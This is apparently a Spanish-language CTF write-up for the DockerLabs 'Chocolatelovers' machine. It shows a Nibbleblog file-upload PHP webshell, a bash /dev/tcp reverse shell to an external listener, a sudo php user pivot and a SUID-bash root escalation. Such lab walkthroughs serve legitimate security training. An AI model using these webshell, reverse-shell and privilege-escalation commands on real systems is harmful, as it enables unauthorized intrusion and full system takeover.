---
layout: post
title: "Chocolatelovers"
date: 2024-09-27
 17:08:23
category: dockerlabs
vm: dockerlabsfacil
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Chocolatelovers </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Nivel:</strong> <span class="easy">Facil</span></td> </tr>
  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
</table>

<br>

**1\.** Descubrimos los puertos abiertos en la maquina, solo tenemos el puerto 80.

`sudo nmap -p- --open -T5 --min-rate=5000 -n -Pn 172.17.0.2`

![img](/notas/public/img/dockerlabs/chocolatelovers/nmap.png){:.margin}

**2\.** Tenemos la web de apache por defecto, pero si revisamos el codigo fuente vemos comentarios de un directorio.

`http://172.17.0.2`

![img](/notas/public/img/dockerlabs/chocolatelovers/80.png){:.margin}
![img](/notas/public/img/dockerlabs/chocolatelovers/80code.png){:.margin}

**3\.** Ya en la ruta nibbleblog vemos que nos da una url del panel administrativo.

`http://172.17.0.2/nibbleblog/`

![img](/notas/public/img/dockerlabs/chocolatelovers/80nibbleblog.png){:.margin}

**4\.** Intento acceder con las credenciales por defecto admin:admin, y si accedimos al panel adminstrativo.

`http://172.17.0.2/nibbleblog/admin.php`

![img](/notas/public/img/dockerlabs/chocolatelovers/nibblepanel.png){:.margin}
![img](/notas/public/img/dockerlabs/chocolatelovers/nibblecontrol.png){:.margin}

**5\.** Si vamos a settings por debajo veremos la version de Nibbleblog que es la 4.0.3, si buscamos vulnerabilidades con searchsploit tenemos uno con la misma version.

`searchsploit nibbleblog`

![img](/notas/public/img/dockerlabs/chocolatelovers/nibbleversion.png){:.margin}
![img](/notas/public/img/dockerlabs/chocolatelovers/nibblesploit.png){:.margin}

**6\.** Revisamos el codigo de dicho exploit, la vulnerabilidad esta en la subida de imagenes donde podemos subir un fichero php, y lo mas importante nos da la ruta y el nombre con el que se almacena.

`searchsploit -x 38489`

![img](/notas/public/img/dockerlabs/chocolatelovers/nibblesploitcode.png){:.margin}

**7\.** Si no tenemos el plugins de imagen nos dirigimos a plugins e instalamos el plugin "My image".

![img](/notas/public/img/dockerlabs/chocolatelovers/nibbleplugin.png){:.margin}
![img](/notas/public/img/dockerlabs/chocolatelovers/nibbleimageinstall.png){:.margin}

**8\.** Ya instalado creamos un fichero php para subirlo y obtener una webshell, al subir nos da muchos errores pero no pasa nada porque el fichero ya se subio.

`nano cmd.php`

`<?php system($_GET["cmd"]);?>`

![img](/notas/public/img/dockerlabs/chocolatelovers/cmd.png){:.margin}
![img](/notas/public/img/dockerlabs/chocolatelovers/nibbleimage.png){:.margin}
![img](/notas/public/img/dockerlabs/chocolatelovers/nibbleimageerror.png){:.margin}

**9\.** Vamos a la ruta que visualizamos en el exploit, vemos que podemos ejecutar comandos. 

`http://172.17.0.2/nibbleblog/content/private/plugins/my_image/image.php?cmd=id`

![img](/notas/public/img/dockerlabs/chocolatelovers/webshell.png){:.margin}

**10\.** Nos ponemos en escucha, y me envio una reverse shell, asi obtenemos acceso a la maquina.

`nc -nlvp 4000`

`http://172.17.0.2/nibbleblog/content/private/plugins/my_image/image.php?cmd=bash -c "bash -i>%26 /dev/tcp/192.168.18.8/4000 0>%261"`

![img](/notas/public/img/dockerlabs/chocolatelovers/webshellok.png){:.margin}
![img](/notas/public/img/dockerlabs/chocolatelovers/ncok.png){:.margin}

**11\.** Reviso los permisos sudo del usuario y encontramos un binario que podemos ejecutar como el usuario chocolate, me apoyo de [gtfobins](https://gtfobins.github.io/gtfobins/php/#sudo) para migrar al usuario chocolate.

`sudo -l`

`sudo -u chocolate php -r "system('/bin/bash');"`

![img](/notas/public/img/dockerlabs/chocolatelovers/sudol.png){:.margin}
![img](/notas/public/img/dockerlabs/chocolatelovers/suchocolate.png){:.margin}

**12\.** Listamos procesos, vemos que root ejecuta un script, revisando los permisos del fichero vemos que nos pertenece y podemos modificarlo. 

`ps -aux`

`ls -l /opt/script.php`

![img](/notas/public/img/dockerlabs/chocolatelovers/ps.png){:.margin}

**13\.** Le damos permisos suid a la bash y listo.

`echo '<?php exec("chmod u+s /bin/bash"); ?>' > script.php`

`bash -p`

![img](/notas/public/img/dockerlabs/chocolatelovers/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>